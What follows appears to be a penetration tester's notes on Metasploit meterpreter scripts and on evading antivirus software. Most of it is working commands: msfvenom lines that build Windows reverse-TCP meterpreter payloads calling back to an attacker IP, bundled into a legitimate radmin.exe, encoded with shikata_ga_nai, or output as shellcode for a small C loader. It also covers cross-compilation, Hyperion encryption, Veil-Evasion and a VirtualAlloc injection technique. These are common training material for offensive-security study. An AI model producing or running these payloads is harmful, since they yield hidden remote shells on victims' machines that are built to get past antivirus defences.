# Scripts that can be run in an open session

/usr/share/metasploit-framework/scripts/meterpreter

# AutoRunScript
# PrependMigrate
# SessionCommunicationTimeOut

# Bypassing Anti-virus

### Packing

/usr/share/windows-binaries/

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
```

### Encoding

`msfvenom -l encoders`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe
```

### Custom Cross Compilation

Generate shellcode with:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
```

Generate random string with:
```
cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512
```

```
#include <stdio.h>
unsigned char random[]= "s0U...";
unsigned char shellcode[]= "\xfc\xe8...";
int main(void)
{
((void (*)())shellcode)();
}
```

```
i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
```

### Encrypting Executables with Hyperion

```
wine ../hyperion ../meterpreter.exe bypassavhyperion.exe
```

### Evading Antivirus with Veil-Evasion

#### VirtualAlloc injection method

* Python `Ctypes` library, gives us access to Windows API function calls and can create C-compatible data types.
* Use `Ctypes` to access the Windows API `VirtualAlloc`
* Creates a new executable memory region for the shellcode and locks the memory region in physical memory, to avoid a page fault as shellcode is copied in and executed.
* `RtlMoveMemory` is used to copy the shellcode bytes into the memory region created by `VirtualAlloc`.
* The `CreateThread` API creates a new thread to run the shellcode
* `WaitForSingleObject` waits until the created thread is finished and shellcode has finished running.

```
./Veil-Evasion.py
```
